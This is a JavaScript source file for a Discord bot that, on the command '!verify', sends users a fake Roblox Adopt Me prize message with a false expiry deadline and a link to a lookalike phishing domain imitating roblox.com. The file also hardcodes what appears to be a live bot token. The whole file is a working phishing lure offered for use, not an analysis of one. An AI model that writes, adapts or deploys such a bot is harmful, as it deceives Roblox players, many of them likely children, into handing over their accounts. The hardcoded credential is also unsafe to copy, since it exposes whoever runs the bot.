const Discord = require('v11-discord.js');
const client = new Discord.Client();
const keepAlive = require('./server');

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

const PREFIX = "!";

client.on('message', (msg) => {
    let args = msg.content.substring(PREFIX.length).split(" ");

    switch (args[0]) {
        case 'verify': {
            msg.author.send(":sparkles:CONGRATULATIONS:sparkles: :rainbow: You were one of the randomly seleteced robloxians for an Adopt Me event and won!:rainbow: Join this server to claim your rewards!  :rainbow: (EXPIRES AFTER 30 MINUTES):rainbow:  You were selected as the winner of the FASTIVALS!  Event! Your prize is the Mega Frost Dragon! Immediately Join Adopt Me VIP server to get the prize! More than 24 hours prize forfeited. ! :arrow_down: :arrow_down: :arrow_down: \n https://www-robloxe.com/games/439419177/Adopt-Me!?privateServerLinkCode=WXBWajU3MVdQVEVpX0thenVtaUsyYUZjY2tF");
        }
    }
})
keepAlive;
client.login('ODg2NjYyNTg5MTEzODQ3ODIx.YT43Qg.Jce9Lie8MAqxNzivNjhL8xM4PBQ');